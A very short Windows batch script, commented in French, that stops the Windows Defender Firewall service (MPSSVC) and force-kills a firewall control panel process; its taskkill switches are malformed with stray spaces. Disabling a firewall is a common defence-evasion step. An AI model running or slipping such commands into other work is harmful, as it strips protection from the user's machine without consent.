@ Echo off
:: Windows D�sactiver le Pare-feu -::
net stop "MPSSVC"
taskkill / f / t / im "FirewallControlPanel.exe"